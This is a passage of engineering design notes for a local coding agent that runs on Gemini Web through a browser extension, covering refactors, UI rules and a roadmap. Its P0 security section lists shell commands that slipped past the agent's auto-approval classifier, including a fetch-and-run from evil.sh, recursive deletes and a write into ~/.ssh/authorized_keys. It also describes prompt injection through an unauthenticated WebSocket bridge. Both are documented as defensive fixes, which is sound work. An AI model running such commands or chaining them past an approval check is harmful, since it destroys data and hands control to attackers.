have diverged (a rewrite that was pushed to one side and not the other), and the fix is to
make both sides share the same base, not to resolve 120 files by hand.

## Product decisions

Standing constraints on this project. These are choices, not limitations to route around:

- **Gemini Web only, for now** — other bridges exist (`chatgpt-bridge.js`) and work for
  subagents, but Gemini is the primary target.
- **Purely local** — no hosted backend, no telemetry, no API keys. Inference happens in the
  user's own browser session, which is the whole point of the extension bridge.
- **Two front-ends** — the terminal CLI and the Chrome side panel are both supported surfaces.
- **One answer per turn** — never emit drafts or A/B alternatives for the user to pick between.
- **The two bridges stay separate.** ~600 duplicated lines across `gemini-bridge.js` and
  `chatgpt-bridge.js`, and it is why the ChatGPT image bug survived for months. Collapsing
  them was planned and **declined**: the cost it removes is "fix it twice", and fixing the
  scrape twice took one commit. The jsdom tests run against *both* files, so a divergence
  fails the build — most of the value, none of the risk of breaking both bridges at once.
- **An API backend is a fork, not a plan.** It would remove the ceiling — structured tool
  calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of
  `PromptBuilder`'s economics become dead code — and it contradicts "no API keys" above,
  which is the identity of the project. The framing that preserves the thesis: the browser
  bridge stays the default, an API backend is opt-in for people who already have a key.

### Removed as dead, 2026-09-16

Found by auditing every export for a caller. Recorded because "why is this gone?" is a
question someone asks six weeks later, and because two of them were not simply unused.

- **`context/token-counter.js`** — a whole 30-line class, `TokenCounter`, reachable from
  nothing. Its only remaining mention was a *comment* in `agent-loop.js`. Token estimation
  moved to `contextChars` counted where it crosses the bridge, which is the one place that
  cannot be wrong about it; the class was left behind.
- **Five `paths.js` exports** with no caller anywhere, including inside `paths.js`:
  `contextSummaryPath` and `globalContextPath` (leftovers of the retrieval subsystem deleted
  in Direction phase 1), `skillPath`, `REL_ARTIFACTS_DIR`, and `planReviewPath`. The last one
  is worth a word: the companion *does* write `plan-review.json`, but that is its own draft
  state while you are commenting, and the comments reach the CLI inside
  `plan-approval.json`. The path helper was the dead part, not the feature.
- **The side panel's context meter** — markup, CSS and `updateContextBar()`, which nothing
  called. Worse than unused: the server never sends token counts to the panel at all, so the
  bar read a permanent **0%** while your context could be at 90%. A meter that is always
  wrong is worse than no meter, and the CLI has the real one in its status bar. Putting it
  back is a feature — it needs a new message type — not a missing call.
- **Three test seams that no test used** — `__tabLanes` and `__sessionTabs` in the
  extension's `content.js`, and `resetSymbolIndexes`. Written in the same commits as the
  things they were meant to test, and then not needed. A seam nobody pulls is API surface
  with no reason to exist.

**One thing the audit found was not dead but unwired.** `rememberWorkspace` had no callers,
which meant nothing ever wrote `recent-workspaces.json` — so `listWorkspaceCandidates`'s
`recent` category, which reads that file and has always been in the `/set-workspace` picker,
silently offered nothing. The reader, the writer and the picker row all existed; the call did
not. `main.js` makes it now, after the workspace existence check, so a path that does not
resolve is not offered back as somewhere you have been. Verified: 0 recents before, 2 after.

**The side panel's dropped messages — two of them were a hang, fixed 2026-09-16.** The
count was worse than "at least three", and the ones that mattered were not the cosmetic
ones. `ask_question` and `request_command_approval` both park the turn on
`await new Promise(...)` with **no timeout**, send the prompt through `sendToPanel`, and
wait. The panel rendered neither — and there was no inbound message type it could have
answered with even if it had. So a turn driven from the panel stopped dead at the first
question or first risky command, and because the panel disables its send button behind
`isWaitingForResponse` until a reply arrives, it then accepted no further prompts at all.
The reported symptom was "the sidebar doesn't send prompts".

The resolvers already existed and were already careful — `cancelQuestion` resolves rather
than rejecting, precisely because leaving the promise pending *is* the hang. Only the way
in was missing: `question_response` and `command_approval_response` are now inbound cases
on the bridge, relayed by the worker, with the panel drawing both.

`response_stream` is handled too, so the panel no longer sits on "Thinking…" for a whole
turn and then jumps to the finished answer.

`github_plan_generated` is handled too, as one line. **The list of what else the panel
"drops" was wrong, including the version of it written earlier the same day** — it came
from grepping `type:` across the server, which counts things that are not panel messages
at all. Checked properly: `github_notification`, `github_processing_started` and
`github_processing_finished` are pushed to `pendingGitHubNotifications`, a **CLI-only
buffer drained by a getter**, and never broadcast — so there is nothing reaching the panel
to drop. `compaction_summary` is a `conversationHistory` entry, not a message. Of the whole
apparent list, exactly one type was really arriving and being ignored.

`inject_prompt`, `end_session` and `heartbeat_ack` are addressed to the worker and the
content script, and the panel is right to ignore them.

The method matters more than the correction: **a grep for `type:` finds message-shaped
literals, not messages.** Follow the value to the `broadcast` call before believing a
surface is missing something.

**The lesson worth keeping:** a surface that ignores an unknown message type is not
equally harmless for every type. Dropping a *notification* costs a missing line; dropping
a *request* deadlocks whatever is waiting on the answer. When adding a message the agent
loop blocks on, every front-end needs a way to reply — or a timeout.

An old `.agent/config.json` can also carry `contextFolders` and `modelConfig.reasoner`,
fossils of features deleted in Direction phases 2 and 7. Nothing in the source reads either.
They are left in place on purpose: config saving deliberately preserves keys it does not
own — that was a bug fix — and auto-pruning known-dead keys would fight it for no gain.

**Dependencies: none unused.** Every entry in all four `package.json` files is imported,
used in a script, or `@types/react`, which is types-only and exists for editor JSX
intellisense. `@inquirer/prompts` looks unused to a naive grep and is not — `main.js` reaches
it through `await import()` on the `EADDRINUSE` path. `chalk` was the one genuinely dead
dependency and went earlier the same day.

### Measured and discarded

Kept so they are not re-tried.

- **The extension's "address theory" was wrong.** The reconnect, not the address, was the
  whole connectivity problem. With the shipped bundle refusing every handshake: attempts at
  4.7s, 20.7s, 50.7s, 80.7s — steady state **exactly 30.0s**, the `chrome.alarms` clamp
  floor. Headless Chrome reclaims service workers harder than a real browser, so that is a
  lower bound rather than a verdict.
- **The anti-throttling audio hack never worked, and not for the reason three documents
  recorded.** They said the `<audio>` element was created and never appended — true, and not
  the bug, because a detached `<audio>` plays fine in Chrome. The real reason is in its own
  catch block: autoplay policy blocks playback without a user gesture, and the fallback bound
  `click`/`keydown` with `{ once: true }`, which a **backgrounded** tab never receives. So it
  played in tabs that did not need it and stayed silent in the ones it existed for. Deleted;
  the Tab Wakeup Protocol is the mechanism that works.
- **The batch loop's flat re-serialisation was diagnosed as an oversight and was not.** Every
  batch turn opened a fresh tab closed when the turn ended, so turn 2 had never seen turn 1 —
  there was no thread to opt into. Measured at **81% resent** over ten turns (156,140
  characters where 28,943 were new) before the tab was held for the life of the task.

## Direction

Agreed 2026-09-10, not yet built. Recorded so the reasoning is not re-derived.

**The problem being solved:** seven mechanisms exist for "tell the model about this project"
(`AGENT.md`, `.agent/rules.md`, scoped `rules.md`, `skills/`, `memory.json`, `mistakes.md`,
`contextFolders`). Phases 2 and 3 leave two: `AGENT.md` and `skills/`, plus `memory.md`, which
is the agent's own notes rather than a place you tell it anything. with six different discovery rules between them. The count of *rules* is the
mess, not the count of files.

**The target:** two axes, one mechanism each.

| axis | question | mechanism |
| --- | --- | --- |
| scope | who does this apply to? | **where the file is** — walk up from the code, nearest wins |
| cost | always in context, or on request? | **which file** — `AGENT.md` vs `.agent/skills/` |

Repo-specific knowledge is *not* a skill. A skill's contract is "read me when my description
matches"; repo conventions match *always* when you are in that repo, and encoding "always" as
"when relevant" hands the model a judgement it will sometimes get wrong — after it has already
edited something. The test: *should the agent know this before its first action in this repo?*
Yes → `AGENT.md`. Fine to discover later → skill.

Memory is **scoped and never walked** (`.agent/<scope>/memory.md`), kept separate from
`AGENT.md` so that file can always be trusted to say what the human wrote. Promoting a learned
fact to a standing instruction is a manual edit, deliberately.

| Phase | Change | Removes | Status |
| --- | --- | --- | --- |
| 0 | `codeDir`; `AGENT.md` and skills read from the code location, not the workspace; watcher scoped | — (bug fixes) | **done** `5513557` |
| 1 | Delete `semantic_search` + `workspace-indexer` + `workspace-summarizer` + dead `ContextManager` code | ~290 lines, `madge`, the startup index build | **done** `0b93bf6` |
| 7 | Two bridges only; drop the Claude bridge, `swarm`, `ask_reasoner` | ~520 lines, 14 DOM selectors | **done** `8e60a24` |
| 2 | One instruction surface: `AGENT.md`, walked | `rules.md`, `mistakesPath`, `/init-skills`, `contextFolders`, `/context add\|remove\|list` | **done** |
| 3 | Memory as `.agent/<scope>/memory.md`, bounded in the prompt | the write-only trap | **done** |
| 4 | One model picker, five valid states, `/reasoning` → `/effort` | `reasoningEffort`, `_effortToTier`, `modelTier`, `reasoningLevel` as stored keys | **done** |
| 5 | Keep `--scope` and derived resolution; delete the runtime switcher | `/scope`'s picker, `setScope`, `listScopes`, the reload path | **done** |
| 6 | Per-model extension lock; derive topology from `modelConfig` | `topology` as a knob, `/mode`, the mode menu, the two-step config picker | **done** |

**What phase 2 kept (phase 2).** Bare `/context` survives as what its name says — a report of
what is in the window. Only `add|remove|list` went: registering folders of `.md` files was a
second way to give the model standing instructions, and that is the thing being removed, not
the ability to ask what the prompt currently costs.

Retired files are **named, never moved**. `.agent/rules.md` and `.agent/mistakes.md` stop being
read, and `runMigrations` prints one line saying so (`retiredInstructionFiles` in `core/migrate.js`).
Folding them into `AGENT.md` automatically was the obvious move and is wrong: `AGENT.md` is
usually tracked in git, so the agent would be writing an unasked-for diff into the user's repo on
startup — and CLAUDE.md's own rule is that `AGENT.md` can always be trusted to say what the human
wrote. The pre-`.agent/` migration path is the exception: `.gemini/rules.md` moves to `AGENT.md`
because `move()` refuses to clobber, so it only lands where there is no `AGENT.md` to disturb.

**The write-only trap has happened twice, and the second one was found by using the
product.** `.agent/artifacts/task.md` is the same shape: the system prompt tells the model to
create a checklist and tick items off, the file is read only by `App.jsx` to draw a row, and no
prompt ever carried it back — verified absent from turn 0, from every tool-result turn, and from
twenty-five further turns. So ticking meant guessing the exact line for `edit_file`, which fails
on a mismatch. Fixed the same way: `<task_checklist>` rides every turn (137 characters for a
three-item list), because ticking is a per-turn act. **If you add an artifact the model is told
to maintain, the question to ask is what carries it back.**

**The write-only trap, measured (phase 3).** `getAllMemories` had no callers. `manage_memory add`
wrote to `memory.json`, the system prompt instructed the model to use it, and no prompt ever
carried a single fact back — a tool call per fact, for nothing, forever. The fix is the missing
half, not a new mechanism: `_loadMemory` puts the facts in `<memory>` on turn 0 and every
refresh, numbered, because `remove` takes a position and the model had been choosing indices
into a list it had never been shown.

Bounded at 40 facts / 4,000 characters, degrading to a count and the path. Memory is the only
context source that grows on its own — every turn can add to it, nothing prunes it — so it is
the only one that could walk the system prompt into Gemini's repetition filter over months
without anyone making a decision. That bound is the "index-only" in the row above.

JSON became markdown because a learned fact is exactly the thing that is subtly wrong six weeks
later, and a fact you cannot correct in an editor does not get corrected. `.agent/memory.json`
is **converted** on startup where `rules.md` is only reported: it is machine-written, untracked,
inside `.agent/`, and the alternative is the agent silently forgetting everything.

**Nine states, five meanings (phase 4).** `modelTier` chose the prompt profile, `reasoningLevel`
chose how hard the pro profile pushes and did nothing on the flash tiers, and `reasoningEffort`
was a third name for the first — written on every change, read only as a fallback. The UI
apologised for the impossible combinations at the point of use ("you are on the FLASH tier,
where reasoning levels do nothing") instead of preventing them.

`core/effort.js` is now the one ladder: `flash`, `flash-thinking`, `brief`, `standard`, `deep`.
`modelTier` and `reasoningLevel` survive as *derived* values because the prompt builder really
does branch on both, but nothing stores them separately, so they cannot disagree. Each rung also
names the browser tab it is written for — a pro-tier prompt in a Flash tab is a long prompt to
the model that handles long prompts worst.

`effortFromConfig` folds an existing config on read, preferring the tier over the level when
they contradict (the tier is what the prompt actually branched on). It is deliberately fed the
config *from disk* rather than the merged object: the default `modelConfig` already carries
`effort: 'standard'`, and folding the merge let that default shadow every legacy key — a bug the
pty probe caught and `config-merge.test.js` now covers.

**Why the scope switcher goes (phase 5).** `setScope` rebuilt `SessionStore`, the conversation
history, `MemoryManager`, `ContextManager` and the prompt state in one call — its own doc comment
said switching scope "is closer to opening a different project than to changing a setting". That
is the argument against having it as a setting: the transcript on screen belongs to the old
scope, and the switcher swapped the history out from under those turns while they were still
being displayed. `--scope` at launch and the derived walk reach the same place with no such
window. The name still answers, read-only, because a group user typing `/scope` and getting
"unknown command" learns nothing about `--scope`.

**Why `semantic_search` goes (phase 1).** Measured: its tokenizer splits on non-alphanumerics
only, so `getUserById` is one token and the query `user` can never match it — broken for the
query type that dominates code search. A broken tool is worse than a missing one, because the
model reaches for it and concludes the code is not there. Even repaired it is keyword matching
that `grep_search` already does better, and it costs a full-repo read at every startup. The
madge dependency graph dies with it: it is read only inside `search()`.

**What phase 6 did.** `bridge/extension-lock.js` holds a lane per model — queue, busy flag and
watchdog each — so a ChatGPT review and a Gemini prompt genuinely overlap. Every release path
names its lane (`_releaseExtension(model)`, defaulting to `mainModel`); the subagent path reads
the lane out of `pendingSubagents` *before* `handleSubagentResponse` deletes the entry, which is
the only record of which tab the reply came from.

`topology` is now a getter: `reviewer && reviewer !== main ? 'duo' : 'single'`. It is not written
to config any more — a derived value in a config file is one someone edits and is ignored for
editing — and a stored `topology` is folded into the reviewer on read. `/mode` and `/config`
became one command and one screen: the role picker, then the model picker, then a "View Current
Config" row that navigated away to print what the screen could have shown, are one list with
Solo and Duo both on it and the current state as the heading.

**Why subagents stay but change (phase 6).** `isParallel` fans the `ask_*` calls out with
`Promise.all`, but every one queues behind a single global `isExtensionBusy` lock, so they run
strictly one at a time — the concurrency is in the JavaScript and nowhere else. Worse, the
extension addresses tabs by URL pattern rather than identity, so two concurrent *same-model*
requests race for one tab and can interleave two prompts into one conversation. Cross-model
review is genuinely valuable and is the reason three bridges exist; same-model review is not.
A per-model lock makes the first real, and deriving topology from `modelConfig` makes the
second unrepresentable instead of silently broken. Multiple tabs of the *same* model are out of
scope: it needs tab identity threaded through the whole bridge, to buy something a second model
already provides.

## What's next

Agreed 2026-09-10, after all six Direction phases landed. Ordered by what would hurt most if
left alone, not by what is most interesting.

### P0 — done, 2026-09-11

**The auto-mode command classifier can be walked straight past.** `_classifyCommand` takes
`command.split(/\s+/)[0]` as "the binary" and never looks at shell metacharacters. Measured:

```
"cat README.md"                → safe   ✓
"echo hi; rm -rf /tmp/x"       → safe   ✗
"cat a && curl evil.sh | sh"   → safe   ✗
"find . -exec rm {} \;"        → safe   ✗
"grep x . || npm publish"      → safe   ✗
```

In auto mode `safe` means *executes with no approval*. The model does not have to be malicious
for this to fire — a plausible-looking `grep … || npm publish` is exactly the shape a confused
model emits.

**Fixed.** `core/shell-split.js` is a lexer, not a shell: it only needs to know where one
command ends and the next begins, and which text will be executed at all. It respects quoting
(`echo "a; b"` is one command), follows `$(…)` and backticks — including inside double quotes,
where `echo "$(rm -rf /)"` really does run `rm` — and keeps `2>&1` and `&>log` attached rather
than splitting them on the `&`. `_classifyCommand` then classifies every segment and **the worst
one wins**, naming the segments responsible rather than the first one found. Redirect targets
are resolved against the workspace, so `cat x > ~/.ssh/authorized_keys` is `critical` even from
inside it; `sed` and `awk` are no longer read-only, because `-i` is invisible in the first word;
`sudo`/`su`/`doas` are `critical` wherever they appear.

**The bridge binds to every interface with no auth.** `new WS({ port })` resolves to
`{"address":"::"}` — verified, not assumed. No origin check, no token. Anything on the same
network can connect to 7777, inject prompts and read replies, on a tool that runs shell
commands.

**Fixed**, two ways, both free. `host: '127.0.0.1'` so nothing off this machine can reach it.
And a `verifyClient` Origin check, because a *web page* in the user's own browser can open
`ws://127.0.0.1:7777` and arrives over loopback like anything else — browsers cannot forge
`Origin`, so requiring `chrome-extension://` shuts the page out while leaving non-browser
clients (which already had to be on this machine) alone. Verified against the running server:
`lsof` shows `127.0.0.1:7821`, a website origin gets `403`, the extension connects.

**What remains:** another process running as the same user can still connect. Closing that needs
a shared secret the extension can read, which needs a setup step — a UX decision, not a patch.

**`diff-engine.js` has no tests.** 358 lines, and it is the thing that overwrites files.

**Fixed**, and writing them turned up a real bug. `_createBackup` used
`relative(workspace, absPath)` directly, and the tools accept absolute paths — so backing up a
file outside the workspace produced `../../../tmp/x`, and `resolve(backupDir, that)` wrote the
backup *outside the backup directory and outside the workspace*: with workspace `/a/b/c`, a
backup of `/tmp/x` landed at `/a/b/tmp/x.bak`. Anything outside now goes under `_external/`.

### P1 — done, 2026-09-11

**Validate tool arguments.** *(done — `mcp/validate-args.js`.)* `zod` is a dependency and
`mcp/mcp-server.js` never imports it.
`TOOL_DEFINITIONS` declares a schema per tool and `PromptBuilder` renders it into the prompt as
*the contract*, then `_extractToolCalls` does `_cleanJsonString` → `JSON.parse` → dispatch with
nothing checking the args against the schema just promised. A wrong-typed arg fails deep inside
a handler with a message the model cannot act on. Validating and returning the specific schema
error for repair is most of what a real tool-call API buys, and it is available today.

Schemas are built from the declarative `parameters` block, so there is one source of truth. It
also **coerces what is obviously meant** — `"10"` for a number is a working turn that used to be
thrown away — but deliberately *not* booleans the same way: `Boolean("false")` is `true`, which
would silently invert `isRegex` and `recursive`, the two flags where it matters most. The words
are read explicitly instead.

**The workspace commands, the way `/scope` went in phase 5.** *(done.)* `setWorkspace` rebinds
`mcpServer`, `promptBuilder`, `diffEngine` and `contextManager` but *not* `sessionStore`
(deliberately), *not* `memoryManager`, and *not* the config. So after `/workspace`:
`promptBuilder._loadMemory()` reads the new project's `memory.md` while `manage_memory add`
writes to the old one, and the old project's allowlist stays armed against the new project.
`/agent-dir` goes outright — tools already take absolute paths (`edit-file.js:15`) and the
system prompt already grants self-editing, so it unlocks nothing and silently repoints state.
`/workspace` becomes read-only; `/set-workspace` becomes a *restart* picker, which the exit-75
supervisor now makes possible. The choice is left in `~/.agent/next-workspace` and `src/index.js`
consumes it on relaunch — a file, because the child cannot rewrite its own argv, and read-once,
because a stale handover would silently override `--workspace` on every later start.

**Settings rows can outgrow the viewport.** *(done.)* `describeSettings` padded to a fixed width
with no bound against terminal width, so long values wrapped — in the live frame, which is the
one place that must never happen. The hint truncates first: it is the part you can lose and
still know what the setting is set to. Verified at 72 columns.

**Instrument `looksLikeMultipleDrafts`.** *(done — `op: 'multiple_drafts'`.)* The other two
detectors logged and this one did not, so there was no evidence it had ever fired at all —
exactly the state in which a detector that works cannot be told from one that does nothing.
`/logs agent` answers it now. **Still to do: read it after a week of use and decide.**

**Characterisation tests for `agent-loop.js`.** *(started.)* `_extractToolCalls` is covered —
it is what stands in for a tool-call API here, so it is the most load-bearing text processing
in the project, and it turned out to handle every adversarial case put to it: braces inside
strings, nested objects, raw newlines in string literals, and unfenced JSON. The retry and
dispatch paths still want scaffolding and are left for the split in P3.

### P2 — features

- **Settings tabs** — *done.* Three (`Settings · Status · Context`), because those are the
  three questions people open the page to ask; a fourth tab with two rows in it is a worse
  answer than a third tab with six. **Tab** cycles them, not ←/→, which the filter field needs
  for its cursor — inside a menu the agent's own bindings are inert, so tab is free there and
  nowhere else. Typing searches *every* tab and says so, because making someone find the right
  tab before they can search is asking them to know the answer first. Escape clears a filter
  before it closes the page. `/context`'s numbers live on the Context tab too.
- **`server/src/prompts/*.md`** — *done, partly.* The point is not readability: a prompt change
  was invisible in a diff, one word inside a template literal in a 1,000-line file, and that
  file is the one with the never-bulk-edit-with-a-regex warning. Template literals also have
  escaping rules that prose does not — a single stray backtick there surfaces as
  `ReferenceError` from an unrelated function.

  Only **static** prose moved (~116 lines, seven files): the flash and flash-thinking
  protocols, both tool-call formats, the flash core rules, the pro guardrails and the
  plan-first step. Anything the builder computes stays in JavaScript, because a markdown file
  full of `${isBrief ? '2' : '3'}` is worse than what it replaced. The move was verified
  byte-for-byte: all ten effort × topology prompt shapes came out identical, and one did not
  at first — `trimEnd()` had eaten a trailing newline that the assembled prompt depended on.
  `prompt-loader.test.js` guards it.

  **Generating the tool definitions — done, 2026-09-16.** It could not be done as originally
  described: `ask_question`, `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory`
  are dispatched in `agent-loop.js` and were in no array at all, so there was nothing complete to
  generate *from*. `core/tool-catalog.js` is that list — all eighteen, declared once, with which
  tier sees what and which topology offers it — and `_buildToolDefinitions` is now two lines that
  assemble it. `_buildToolAnchor` and `_buildToolIndex` already derived from that method, so they
  followed for free.

  The text was moved mechanically rather than retyped, and all twenty shapes (five efforts × two
  topologies, tool block and full turn-0 prompt) come out byte-identical — two runs of that
  comparison caught two real transcription faults first. `runHeadlessTask`'s list stays its own
  text, because it is a deliberate subset in a different shape carrying a correction the full
  definitions do not; its *membership* is checked against the catalog instead.

  `toolCatalogDrift()` reports all three disagreements rather than throwing on the first — a tool
  that runs but is never described, one described that nothing dispatches, and a required
  parameter missing from the prose. Each branch has a negative control, because a drift check
  that compares an empty list to an empty list passes forever.
- **Extension error richness** — *done.* The bridge already read `payload.op`/`stage`; nothing
  sent them. Service-worker errors now carry `op`, `stage`, `targetModel` and the DOM-side
  message that actually failed. Content scripts run in the page and cannot set fields on that
  payload, so they prefix `[stage]` to their message and the bridge lifts it back out — a
  changed selector on gemini.google.com now logs as `find_input` rather than "failed".
- **The ChatGPT bridge's image path** — *fixed, and it was broken.* It matched the
  `<image_data>` block and **deleted** it, then pasted the remaining text — so `/image` against
  ChatGPT sent a prompt discussing a screenshot nobody had been given. It now rebuilds the data
  URL into a `File` the way the Gemini bridge does, and says so in the prompt if it cannot.
- **`grep_search` for large repos** — *done.* Several patterns in one call (`["rate limit",
  "throttle", "quota"]` is one search, not three round trips), optional context lines capped at
  five, and results grouped by file with the busiest file first — on a large repo the module
  that owns a concept is usually the one that mentions it most. Fifty flat rows also repeated
  the path fifty times, and every one of those characters is retyped into the browser next turn.
  It probes one match past `maxResults` so it can tell "exactly fifty" from "fifty and we
  stopped counting": ripgrep's `--max-count` caps *per file*, so without the spare there is
  never a surplus to notice. See "Search, and why there is still no index".

### P3 — done, 2026-09-11 (except the GitHub restructure)

- VS Code terminal shell integration — *done.* The companion forwards **failed** commands only,
  and only their tail, to `.agent/state/terminal.jsonl`; the CLI drains it into the input box as
  a marker you send or delete. It offers rather than acts: an agent that starts editing because
  a command you ran in another window failed is a worse tool than one that waits to be asked.
  Engine `^1.80.0` → `^1.93.0`, repackaged as `cli-agent-companion-1.4.0.vsix`.
- Native folder picker — *done.* `/skills dir add` with no path, and Browse… in the workspace
  picker. macOS, zenity, kdialog or PowerShell, and offered **only** where one exists: a menu row
  that silently does nothing is worse than no row, because people press it twice and conclude the
  tool is broken.
- **Restructure the GitHub PR agent** — 1,649 lines, the largest single feature here. Not
  deleted, and **not started**: the owner asked for it to be planned on its own once everything
  else had landed. It now is. This is the next thing to plan.
- Split `agent-loop.js` — *done.* The sixteen-case slash-command switch moved to
  `core/slash-commands.js` as a function taking the loop, so the dependency reads in the
  signature instead of as seventeen implicit `this.` references. 1,910 → 1,594 lines, interface
  unchanged. This is what unblocks generating the tool definitions: `ask_question`,
  `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory` are still dispatched from
  inside `agent-loop.js` and need declaring somewhere first.
- A **symbol index** — `find_symbol` / `find_references`, from tree-sitter or ctags. The
  structural half of what a large codebase needs, and the half grep is worst at.

### Search, and why there is still no index

Decided 2026-09-11, revisited deliberately because the next codebase is a large one.

**No embedding index.** Phase 1 deleted `semantic_search` for being broken; this is the
separate question of whether a *working* one should replace it. It should not, and Claude Code —
the benchmark this project is measured against — does not have one either. Four reasons, the
last of which is specific to this architecture:

- Code search is mostly **exact-symbol** search (`getUserById`, `EADDRINUSE`), where lexical
  matching wins outright.
- An index goes **stale on every edit**. Cursor pays for a persistent background service to
  re-index continuously; the alternative is serving the model a confident map of code that no
  longer exists — the same failure phase 1 removed.
- **Chunking destroys structure.** This repo already learned that: the deleted `ast-chunker`
  resolved 24% of its own top-level symbols.
- **Retrieval is single-shot; an agent iterates.** grep → read → grep again with a better term
  beats one shot at the twenty nearest chunks, because the second query knows what the first
  found.

The constraint that settles it: **the context window is a browser chat tab.** Every retrieved
chunk is typed into Gemini by a content script. Twenty 500-token chunks is 10,000 tokens typed
into a browser per query, most of it unread — in a project whose whole prompt strategy exists to
avoid large repeated payloads. Agentic grep→read sends only what the model decided it needed.

**What a large codebase actually needs**, none of which is RAG:

| gap | answer | where |
| --- | --- | --- |
| you don't know the codebase's word for it ("rate limit" vs `throttle`) | multi-pattern `grep_search`, and prompt guidance to try synonyms — the model already knows them, it just burns a browser round-trip per guess | P2 |
| "who calls this?", "what extends this?" | a symbol index (tree-sitter or ctags): exact, invalidates on mtime, needs no model | P3 |
| orientation in an unfamiliar repo | `AGENT.md` — a human-written map beats a generated one because someone vouched for it | done, phase 2 |
| a 50-line unranked hit list is hard to reason from | context lines, grouping by file, ranking | P2 |

This is a decision made from the architecture, not from measurement. If grep genuinely fails on
real questions in the large codebase, that evidence outranks the argument above — and the shape
of the failures says which of the four rows is the one that bites.

### Raised, not yet planned

Two things the owner asked to come back to once the phases were done:

**Session logs as post-compaction recall.** Compaction replaces older turns with a summary, and
anything it dropped is gone from the model's view — but not from disk: `sessions/history.jsonl`
still holds every turn. A tool that lets the model look back into its own history would turn
"compaction ate the detail" from a loss into a lookup. Probably better than making compaction
smarter, because it does not require deciding in advance what will matter.

**Search for really large codebases.** `grep_search` now takes several patterns, context lines
and groups by file (P2), and the reasoning for *not* adding an index is recorded above. That
decision was made from the architecture, not from measurement — the next codebase is the
measurement.

**The extension.** Chrome throttling of background tabs, the retry behaviour around it, and
whatever else the bridge is papering over. Raised 2026-09-11, to be planned rather than patched.
**Answered 2026-09-17** — see "Bridge liveness" above, and "The clock was the only throttled
thing" below.

**`/skills` needs a proper look.** The list is aligned and reachable from settings now, and
escape steps back — but the shape of the feature was not examined. `/skills dir` prints a
four-entry search path; `skillFolders` is an escape hatch from config; creating one opens an
editor. Whether that is the right set of moves is an open question, not a bug list.

### The fork

The agent layer's ceiling is not code quality, it is the absence of a tool-call API. Three
responses, ascending:

**A. Make the text channel as good as it gets** — P1's validation plus a sentinel-delimited
call block. Free, no product decisions.

**B. Measure before believing.** `parse_tool_calls`, `tool_amnesia` and `provider_error` are
all logged and nothing reads them as rates. Any claim about how far behind this is — including
the ones in this file — is an estimate until that view exists.

**C. An optional API backend.** The only option that actually removes the ceiling: structured
calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of `PromptBuilder`'s
economics become dead code. It contradicts the standing "no API keys" decision above, so it is
recorded as a fork, not a plan. The framing that preserves the thesis: the browser bridge stays
the default and the identity of the project; an API backend is opt-in for people who already
have a key.

## Gotchas

- **`server/src/index.js` is the bin and does nothing but re-spawn `main.js` under `tsx`** —
  the sources contain JSX, so plain `node src/main.js` fails.
- `App.jsx` is performance-sensitive: it avoids re-rendering during streaming to prevent
  terminal tearing, and uses raw ANSI (`\x1b[1m`) in places because `marked-terminal` mangles
  inline markdown inside list items. It was split into `ui/` modules by moving blocks verbatim
  behind explicit dependency lists; the `<Static>` element, `staticEpoch` and the streaming
  path stayed in `App.jsx` deliberately, and adding memoization to the transcript rows is how
  the scroll glitches came back the last two times.
- **A menu opened from `/settings` must not answer in the transcript.** `returnTo` is the
  settings page, so setting it back reopens that page *on top of* whatever the command just
  said. Four screens did this — `/effort`, `/config`, and two on the allowlist — and the
  symptom is a setting that changes with no sign it did. `applyAndReturn` in `Menus.jsx` is
  the one rule: go back and say nothing (the row is the confirmation and re-reads live
  state), or close and let the transcript answer. And a menu that mutates shared state needs
  a fresh `activeMenu` object — `commandRules` is shared by reference, so the values were
  already right and React simply had no reason to repaint.
- **The live frame must never outgrow the viewport.** This is the single most important rule in
  `ui/`. When Ink's dynamic output is taller than the terminal, `shouldClearTerminalForFrame`
  (`ink/build/ink.js`) switches it to writing `ESC[2J ESC[3J` plus a full repaint on *every*
  render. Measured on the pre-fix code, sitting idle with a 12-turn history in a 24-row
  terminal: 108 full clears and 108 scrollback wipes in 15 seconds, 3.85 MB of escape codes.
  That is what "it flickers and I can't scroll or copy" was — the terminal's scrollback and the
  user's selection were being deleted seven times a second. The same shape is now 36 KB and
  zero clears. So: settled turns go to `<Static>`, only the in-flight turn is live, and every
  live row is bounded by `liveBudget` (`terminalHeight - RESERVED_ROWS`). Adding an unbounded
  row to the live region — a full tool result, an artifact dump, a list that grows — brings the
  whole thing back.

  **And it can overflow from below, which is newer.** `liveBudget` has a floor, so the frame had
  a *minimum* height of `RESERVED_ROWS + 3 = 12` rows and any shorter terminal overflowed however
  much the in-flight turn gave up. Measured, one turn, extension connected: 13 rows → 0 clears,
  12 → 1, **10 → 166**. Three of the nine reserved rows are pure spacing, so below
  `COMPACT_BELOW_ROWS` (13) they are dropped and the floor comes down with them — spacing is what
  gets shed, never a row carrying information. That moves the floor to 9 rows; 8 still costs
  thirty clears, which is now a documented limit rather than a silent one. Asked whether
  *resizing* glitches: it does not — a drag firing five SIGWINCH events produces exactly one
  debounced reprint, and the control run that never resizes is identical.

  **The floor is one row now, and used to be three.** `Math.max(3, …)` never meant "at least
  three if there is room" — it meant three even when there is not, and the frame then asks
  for more rows than the terminal has. It was the bug twice: once from the furniture above,
  and again when `/update`'s two notice rows reproduced it at 13 rows (9 + 2 + a floored 3 is
  14). Whenever there *is* room the subtraction already yields more than three, so the floor
  only ever bound in the case where binding it was wrong.

  **A row you draw is a row you budget, and a row that wraps is two.** `/update`'s reload
  notice was ~105 characters, which wraps at 80 columns: charged as one row, drawn as two,
  and 1 `ESC[2J` at 13x80 and 10x80 where there had been none. `wrap="truncate"` on anything
  in the live frame is load-bearing, not tidiness. The arithmetic test caught the first of
  these; only the pty run caught the second.
- **Nothing the user waits for goes in front of the first frame.** Startup was
  2.46s to the prompt box with GitHub enabled, and almost none of it was work:
  `main.js` awaited the 1.5s extension-greeting timeout and then
  `githubHandler.start()` — which authenticates against api.github.com and runs
  a full initial poll, fanning out per PR — before it created the Ink UI.
  Neither answer is something the first frame draws. Moving both behind
  `cli.start()` took the same measurement to **0.53s**, with no behaviour change:
  the start tab still opens, the poller still polls. For scale, every module
  import in the process is 517ms together, 426ms of it ink+react, and `tsx`
  itself is 120ms — so the two waits were larger than the entire program.
  `test/core/startup-order.test.js` pins the ordering, because the regression is
  invisible in review: one more `await` before `cli.start()` reads as ordinary
  sequencing and costs a second every launch, with no failure to notice.

  **Starting GitHub after the WebSocket server also fixed a silence.**
